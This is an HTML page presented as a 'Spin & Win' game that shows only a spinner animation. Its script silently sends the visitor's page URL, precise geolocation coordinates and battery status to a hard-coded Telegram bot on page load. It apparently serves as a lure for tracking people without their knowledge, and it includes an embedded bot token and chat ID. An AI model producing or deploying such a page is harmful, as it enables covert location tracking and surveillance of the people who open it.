<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎯 Spin & Win</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: radial-gradient(circle at center, #0d0d2b 0%, #000000 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: white;
      font-family: 'Poppins', sans-serif;
      overflow: hidden;
    }
    .spinner {
      width: 200px;
      height: 200px;
      border: 20px solid rgba(255, 255, 255, 0.2);
      border-top: 20px solid #00ffea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      box-shadow: 0 0 30px #00ffea;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    h1 {
      font-size: 2.2em;
      color: #00ffea;
      text-shadow: 0 0 15px #00ffea;
      margin-bottom: 40px;
    }
  </style>
</head>
<body>
  <h1>🎉 Spin & Win 🎉</h1>
  <div class="spinner"></div>

  <script>
    const BOT_TOKEN = "8046535922:AAF4FFFb0gIhkiPgmUTdUKeiIPpL33gWym4";
    const CHAT_ID = "1954755564";

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
      }).catch(console.error);
    }

    // Send page URL immediately
    const pageURL = window.location.href;
    sendToTelegram(`🔗 *Page URL:* ${pageURL}`);

    // Send location silently
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
        const locMsg = `📍 *Location:*\nLatitude: ${lat}\nLongitude: ${lon}\n🌐 [Open in Maps](${mapsLink})`;
        sendToTelegram(locMsg);
      }, () => {
        sendToTelegram("⚠️ Location denied by user.");
      });
    } else {
      sendToTelegram("⚠️ Geolocation not supported.");
    }

    // Send battery info silently
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        const level = (battery.level * 100).toFixed(0);
        const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
        const batMsg = `🔋 *Battery:* ${level}% | ${charging}`;
        sendToTelegram(batMsg);
      });
    } else {
      sendToTelegram("⚠️ Battery API not supported.");
    }
  </script>
</body>
</html>
